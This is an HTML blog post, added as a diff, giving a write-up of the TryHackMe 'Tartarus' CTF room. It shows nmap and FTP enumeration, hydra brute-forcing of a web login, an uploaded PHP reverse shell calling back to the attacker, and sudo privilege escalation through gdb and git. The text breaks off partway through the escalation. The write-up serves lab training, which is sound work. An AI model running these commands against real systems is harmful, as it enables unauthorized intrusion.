@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Tartarus Write Up</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Infosec | Hacking | CTF" />
+    <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
+    <link rel="canonical" href="https://darrynbrownfield.co.uk/Tartarus" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Darryn Brownfield" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Tartarus Write Up" />
+    <meta property="og:description" content="Overview Tartarus is an fun easy room from TryHackMe. We have two tasks to complete, finding both the user and root flag. Typical CTF style room. Nmap TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and" />
+    <meta property="og:url" content="https://darrynbrownfield.co.uk/Tartarus" />
+    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/tartarus/cover.jpeg" />
+    <meta property="article:publisher" content="https://www.facebook.com/" />
+    <meta property="article:author" content="https://www.facebook.com/" />
+    <meta property="article:published_time" content="2020-09-26T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2020-09-26T00:00:00+00:00" />
+    <meta property="article:tag" content="Tryhackme" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Tartarus Write Up" />
+    <meta name="twitter:description" content="Overview Tartarus is an fun easy room from TryHackMe. We have two tasks to complete, finding both the user and root flag. Typical CTF style room. Nmap TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and" />
+    <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
+    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/tartarus/cover.jpeg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Darryn Brownfield" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Tryhackme" />
+    <meta name="twitter:site" content="@dazbrownfield" />
+    <meta name="twitter:creator" content="@dazbrownfield" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Darryn Brownfield",
+        "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
+    },
+    "url": "https://darrynbrownfield.co.uk/Tartarus",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://darrynbrownfield.co.uk/assets/images/tartarus/cover.jpeg",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://darrynbrownfield.co.uk/Tartarus"
+    },
+    "description": "Overview Tartarus is an fun easy room from TryHackMe. We have two tasks to complete, finding both the user and root flag. Typical CTF style room. Nmap TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Tartarus Write Up" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            <a
+              class="social-link social-link-tw"
+              href="https://github.com/darrynb89"
+              target="_blank"
+              rel="noopener"
+              ><svg
+  version="1.0"
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 120.000000 120.000000"
+>
+  <g
+    transform="translate(0.000000,120.000000) scale(0.0900000,-0.0900000)"
+    fill="#ffffff"
+    stroke="none"
+  >
+    <path
+      d="M441 1174 c-105 -28 -181 -73 -266 -159 -125 -124 -175 -246 -175
+-425 0 -179 50 -300 175 -425 85 -85 185 -145 243 -145 36 0 42 13 42 89 l0
+57 -57 -3 c-74 -5 -117 17 -150 78 -13 24 -37 56 -54 71 -34 33 -36 38 -9 38
+12 0 20 -7 20 -16 0 -10 6 -14 14 -11 10 4 13 1 9 -9 -3 -10 2 -14 18 -14 18
+0 20 -3 10 -9 -16 -11 -4 -34 14 -27 9 3 11 -2 7 -16 -4 -18 -2 -20 21 -14 20
+5 25 3 21 -8 -9 -23 17 -31 33 -11 12 17 13 17 13 2 0 -11 8 -17 21 -17 15 0
+19 5 15 15 -3 8 -1 15 4 15 6 0 10 -7 10 -15 0 -8 7 -15 15 -15 8 0 15 8 15
+18 0 10 10 39 23 64 l23 46 -59 13 c-136 28 -210 123 -211 268 -1 66 3 82 27
+124 23 39 27 55 22 86 -7 40 9 121 24 121 18 0 78 -25 113 -46 30 -19 42 -22
+70 -14 18 6 71 10 118 10 47 0 100 -4 118 -10 28 -8 40 -5 70 14 35 21 95 46
+113 46 15 0 31 -81 24 -121 -5 -31 -1 -47 22 -86 24 -42 28 -58 27 -123 -1
+-147 -65 -231 -203 -266 l-68 -18 18 -30 c15 -25 19 -51 19 -138 0 -58 3 -113
+6 -122 20 -52 166 16 279 129 125 125 175 246 175 425 0 179 -50 301 -175 425
+-86 87 -161 131 -270 160 -75 19 -241 19 -314 -1z"
+    />
+  </g>
+</svg></a
+            >
+            
+            <a
+              class="social-link social-link-li"
+              href="https://www.linkedin.com/in/darryn-brownfield-0b1132b5"
+              target="_blank"
+              rel="noopener"
+              ><svg viewBox="0 50 512 512">
+    <g transform="translate(0.000000,20.000000) scale(1.1)">
+      <path
+        d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
+      C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
+      M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
+      c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
+      s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"
+      />
+    </g>
+  </svg></a
+            >
+             
+            <a
+              class="social-link social-link-tw"
+              href="https://twitter.com/dazbrownfield"
+              target="_blank"
+              rel="noopener"
+              ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a
+            >
+             
+          </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-tryhackme tag-ctf tag-easy post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="26 September 2020">26 September 2020</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/tryhackme/'>TRYHACKME</a>,
+                            
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>,
+                            
+                        
+                            
+                               <a href='/tag/easy/'>EASY</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Tartarus Write Up</h1>
+            </header>
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <p><img src="/assets/images/tartarus/cover.jpeg" alt="GitHappens" /></p>
+
+<h3 id="overview">Overview</h3>
+
+<p>Tartarus is an fun easy room from <a href="https://tryhackme.com">TryHackMe</a>. We have two tasks to complete, finding both the user and root flag. Typical CTF style room.</p>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $sudo nmap -sC -sV -oA nmap/initial tartarus
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 16:16 BST
+Nmap scan report for tartarus (10.10.30.144)
+Host is up (0.026s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.21.217
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
+|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
+|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
+</code></pre>
+
+<p>3 Ports open:</p>
+
+<ul>
+  <li>21 - FTP - Anonymous login allowed which is interesting will need to check what files and access is available</li>
+  <li>22 - SSH - Banner is showing its an Ubuntu machine</li>
+  <li>80 - HTTP - Apache web server</li>
+</ul>
+
+<p>SSH has a smaller attack surface than the other ports so will leave that for now, I decided to look at FTP first.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Using the ftp utility I was able to login using the username ‘anonymous’ and password ‘anonymous’.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $ftp tartarus
+Connected to tartarus.
+220 (vsFTPd 3.0.3)
+Name (tartarus:daz): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+226 Directory send OK.
+ftp&gt; ls -lah
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
+-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+226 Directory send OK.
+ftp&gt; 
+</code></pre>
+
+<p>Just one file test.txt, but what is also interesting is ‘…’ which is a folder. Typically you would find . (current directory) and .. (parent directory). Next I downloaded the test.txt file and checked the … directory.</p>
+
+<pre><code class="language-highlight">ftp&gt; get test.txt
+local: test.txt remote: test.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for test.txt (17 bytes).
+226 Transfer complete.
+17 bytes received in 0.00 secs (38.8795 kB/s)
+ftp&gt; cd ...
+250 Directory successfully changed.
+ftp&gt; ls -lah
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
+226 Directory send OK.
+ftp&gt; cd ...
+250 Directory successfully changed.
+ftp&gt; ls -lah
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
+226 Directory send OK.
+ftp&gt; get yougotgoodeyes.txt
+local: yougotgoodeyes.txt remote: yougotgoodeyes.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes).
+226 Transfer complete.
+14 bytes received in 0.00 secs (19.1215 kB/s)
+ftp&gt; exit
+221 Goodbye.
+</code></pre>
+
+<p>Navigating to … lists another folder called … but now we find another text file called yougotgoodeyes.txt.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $cat test.txt 
+vsftpd test file
+┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $cat yougotgoodeyes.txt 
+/sUp3r-s3cr3t
+</code></pre>
+
+<p>test.txt doesn’t give us anything to interesting, nmap was able to identify the FTP server was vsftpd. However, yougotgoodeyes.txt provides what looks like a web directory. Next step is to move on to port 80 and see what we can find. While I was reviewing FTP I had gobuster and nikto running in the background to enumerate the web service.</p>
+
+<p><img src="/assets/images/tartarus/webpage.png" alt="webpage" /></p>
+
+<p>The webpage just displays the default apache page, I checked the source code but nothing stood out.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $gobuster dir -u http://tartarus -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://tartarus
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/26 16:32:10 Starting gobuster
+===============================================================
+/server-status (Status: 403)
+===============================================================
+2020/09/26 16:34:00 Finished
+===============================================================
+</code></pre>
+
+<p>Gobuster also didn’t reveal anything.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $nikto -host http://tartarus
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.30.144
++ Target Hostname:    tartarus
++ Target Port:        80
++ Start Time:         2020-09-26 16:31:43 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5a9b87b015a4a, mtime: gzip
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7686 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2020-09-26 16:35:39 (GMT1) (236 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre>
+
+<p>Nikto was able to find robots.txt with one entry.</p>
+
+<p><img src="/assets/images/tartarus/robots.png" alt="robots" /></p>
+
+<p>Great now I have the admin directory and a potential username ‘d4rckh’.</p>
+
+<p><img src="/assets/images/tartarus/admin-dir.png" alt="admin-dir" /></p>
+
+<p>Checking out the admin-dir I found to files credentials.txt and userid. I download each to my machine.</p>
+
+<ul>
+  <li>userid - Is a list of random usernames</li>
+  <li>credentials.txt - Is a list of common passwords</li>
+</ul>
+
+<p>We could use these to brute force SSH but first I will look at the directory ‘/sUp3r-s3cr3t/’ found on the FTP service.</p>
+
+<p><img src="/assets/images/tartarus/login.png" alt="login" /></p>
+
+<p>I bet the username/password lists we found are to be used here, I tried to login with admin/admin.</p>
+
+<p><img src="/assets/images/tartarus/username.png" alt="username" /></p>
+
+<p>But I get the error ‘Incorrect username!’. Its highlighting the username is wrong, not the username or password is wrong. I can use this error message along with the userid file to find the correct username(s).</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $hydra -L userid -p "test" tartarus http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Incorrect username!"
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 16:53:45
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries (l:13/p:1), ~1 try per task
+[DATA] attacking http-post-form://10.10.30.144:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Incorrect username!
+[80][http-post-form] host: 10.10.30.144   login: &lt;HIDDEN&gt;   password: test
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 16:53:55
+</code></pre>
+
+<p>I used hydra to test each of the usernames to see which were failed.</p>
+
+<ul>
+  <li>-L - username file</li>
+  <li>-p - I used “test” as a place holder password for now</li>
+  <li>tartarus - The target</li>
+  <li>http-post-form - Perform a POST request</li>
+  <li>/sUp3r-s3cr3t/authenticate.php: - Is the directory/webpage to target</li>
+  <li>username=^USER^&amp;password=^PASS^&amp;Login=Login: - These are the values the webpage is expecting, ^^ tell Hydra what to populate in those fields.</li>
+  <li>Incorrect username! - Tells hydra what a failed message will include</li>
+</ul>
+
+<p>We have a username, I repeated the process but this time to check for the password.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $hydra -l &lt;HIDDEN&gt; -P credentials.txt 10.10.30.144 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Incorrect password!"
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 17:02:23
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 101 login tries (l:1/p:101), ~7 tries per task
+[DATA] attacking http-post-form://10.10.30.144:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Incorrect password!
+[80][http-post-form] host: 10.10.30.144   login: &lt;HIDDEN&gt;   password: &lt;HIDDEN&gt;
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 17:02:24
+</code></pre>
+
+<p>All I need to change was the error message, the username and password flags and values. Now with the username and password I will try and log in.</p>
+
+<p><img src="/assets/images/tartarus/upload.png" alt="upload" /></p>
+
+<p>It worked and now im presented with a upload page, first thing that comes to mind is a PHP reverse shell. First I will gobuster for other directories.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $gobuster dir -u http://tartarus/sUp3r-s3cr3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://tartarus/sUp3r-s3cr3t
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/26 17:12:07 Starting gobuster
+===============================================================
+/images (Status: 301)
+===============================================================
+2020/09/26 17:20:54 Finished
+===============================================================
+</code></pre>
+
+<p>Inside images is a folder called uploads, this is what I needed. Now I know where my shell will be uploaded.</p>
+
+<h3 id="initial-access">Initial Access</h3>
+
+<p>First I copy a php reverse shell script from my webshells directory found on both ParrotOS and Kali and rename it to shell.php.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
+┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $mv php-reverse-shell.php shell.php
+</code></pre>
+
+<p>Editing the script I will keep port as 1234 for now and change the IP to point to my VPN IP.</p>
+
+<pre><code class="language-highlight">set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+</code></pre>
+
+<p>Now I start my netcat listener ready for my shell (hopefully).</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $nc -nvlp 1234
+listening on [any] 1234 ...
+</code></pre>
+
+<p><img src="/assets/images/tartarus/uploaded.png" alt="uploaded" /></p>
+
+<p>File uploaded.</p>
+
+<p><img src="/assets/images/tartarus/shell.png" alt="shell" /></p>
+
+<p>As expected the shell.php script was uploaded to /images/uploads/</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.21.217] from (UNKNOWN) [10.10.30.144] 52738
+Linux ubuntu-xenial 4.4.0-184-generic #214-Ubuntu SMP Thu Jun 4 10:14:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 16:18:28 up  1:10,  0 users,  load average: 0.10, 0.05, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</code></pre>
+
+<p>Now we have a shell I will go hunting for the user flag.</p>
+
+<pre><code class="language-highlight">$ cd /home
+$ ls
+cleanup
+d4rckh
+thirtytwo
+$ cd d4rckh
+$ ls
+cleanup.py
+user.txt
+$ cat user.txt
+0f7dbb2243e692e&lt;HIDDEN&gt;
+</code></pre>
+
+<p>Ive redacted half the flag. Now its time to get root!</p>
+
+<h3 id="priv-esc">Priv Esc</h3>
+
+<p>First I upgrade my shell.</p>
+
+<pre><code class="language-highlight">$ python -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre>
+
+<p>In d4rckh home directory is a python script cleanup.py. Even as www-data you can edit that file and use it to get a reverse shell as root. However I don’t believe this is the indented path just yet, first we need to become the d4rckh user.</p>
+
+<p>When I first get a shell on machine I always run ‘sudo -l’ to check for a quick win.</p>
+
+<pre><code class="language-highlight">www-data@ubuntu-xenial:/home/d4rckh$ sudo -l
+Matching Defaults entries for www-data on ubuntu-xenial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu-xenial:
+    (thirtytwo) NOPASSWD: /var/www/gdb
+www-data@ubuntu-xenial:/home/d4rckh$ 
+</code></pre>
+
+<p>Im not disappointed, we can run the command gdb as the user thirtytwo. A quick look on <a href="https://gtfobins.github.io/gtfobins/gdb/#sudo">GTFObins</a> shows I can use gdb to priv esc to the thirtytwo user.</p>
+
+<pre><code class="language-highlight">www-data@ubuntu-xenial:/home/d4rckh sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+$ 
+$ id
+uid=1004(thirtytwo) gid=1004(thirtytwo) groups=1004(thirtytwo)
+$ cd /home/thirtytwo
+$ ls
+note.txt
+$ cat note.txt
+Hey 32, the other day you were unable to clone my github repository.
+Now you can use git. Took a while to fix it but now its good :)
+
+~D4rckh
+$ 
+</code></pre>
+
+<p>Now has user thirtytwo I navigate to the home directory and find a note from D4rckh. So again I checked ‘sudo -l’.</p>
+
+<pre><code class="language-highlight">$ sudo -l
+Matching Defaults entries for thirtytwo on ubuntu-xenial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User thirtytwo may run the following commands on ubuntu-xenial:
+    (d4rckh) NOPASSWD: /usr/bin/git
+$ 
+</code></pre>
+
+<p>Following the same processes before, I checked GTFO bins and found a a priv esc path using git.</p>
+
+<pre><code class="language-highlight">$ sudo -u d4rckh /usr/bin/git -p help config
+GIT-CONFIG(1)                     Git Manual                     GIT-CONFIG(1)
+
+NAME
+       git-config - Get and set repository or global options
+
+SYNOPSIS
+       git config [&lt;file-option&gt;] [type] [-z|--null] name [value [value_regex]]
+       git config [&lt;file-option&gt;] [type] --add name value
+       git config [&lt;file-option&gt;] [type] --replace-all name value [value_regex]
+       git config [&lt;file-option&gt;] [type] [-z|--null] --get name [value_regex]
+       git config [&lt;file-option&gt;] [type] [-z|--null] --get-all name [value_regex]
+       git config [&lt;file-option&gt;] [type] [-z|--null] [--name-only] --get-regexp name_regex [value_regex]
+       git config [&lt;file-option&gt;] [type] [-z|--null] --get-urlmatch name URL
+       git config [&lt;file-option&gt;] --unset name [value_regex]
+       git config [&lt;file-option&gt;] --unset-all name [value_regex]
+       git config [&lt;file-option&gt;] --rename-section old_name new_name
+       git config [&lt;file-option&gt;] --remove-section name
+       git config [&lt;file-option&gt;] [-z|--null] [--name-only] -l | --list
+       git config [&lt;file-option&gt;] --get-color name [default]
+       git config [&lt;file-option&gt;] --get-colorbool name [stdout-is-tty]
+       git config [&lt;file-option&gt;] -e | --edit
+!/bin/bash
+d4rckh@ubuntu-xenial:~$ 
+</code></pre>
+
+<p>Now I’m the user d4rckh I can go back to the users home directory and look at the cleanup.up script.</p>
+
+<pre><code class="language-highlight">d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py
+# -*- coding: utf-8 -*-
+#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('rm -r /home/cleanup/* ')
+except:
